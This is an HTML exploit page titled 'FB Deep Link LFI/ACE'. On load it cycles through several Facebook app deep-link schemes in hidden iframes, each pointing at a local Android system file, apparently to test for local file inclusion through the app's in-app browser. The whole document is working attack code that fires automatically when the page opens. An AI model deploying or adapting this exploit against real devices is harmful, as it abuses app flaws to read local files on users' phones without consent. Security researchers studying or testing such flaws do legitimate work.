<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>FB Deep Link LFI/ACE</title>
</head>
<body style="background:#000; color:#0f0; font-family:monospace;">
    <h3>Snipping Internal FB Deep Links...</h3>
    <div id="log">Testing routes...</div>

    <script>
        const logEl = document.getElementById('log');

        // We use a universal Android system file to prove Local File Inclusion
        const targetFile = "file:///system/etc/hosts";

        // A list of historically vulnerable FB internal routing schemas
        const deepLinks = [
            `fb://faceweb/f?href=${targetFile}`,
            `fb://browser?url=${targetFile}`,
            `fb://webview?url=${targetFile}`,
            `fb://native_post?href=${targetFile}`,
            `fb://notification_settings?browser_uri=${targetFile}`,
            `fb://page_browser?url=${targetFile}`,
            `fb://canvas?url=${targetFile}`
        ];

        let currentIndex = 0;

        function fireNextLink() {
            if (currentIndex >= deepLinks.length) {
                logEl.innerHTML += "<br>[*] Payload cycle complete.";
                return;
            }

            let link = deepLinks[currentIndex];
            logEl.innerHTML += `<br>[*] Firing: ${link}`;
            
            // We use an invisible iframe to fire the deep links without
            // destroying our main execution context
            let iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = link;
            document.body.appendChild(iframe);

            currentIndex++;
            
            // Fire the next link after 800ms
            setTimeout(fireNextLink, 800);
        }

        // Delay start to ensure the page is fully loaded in the IAB
        setTimeout(fireNextLink, 1000);
    </script>
</body>
</html>
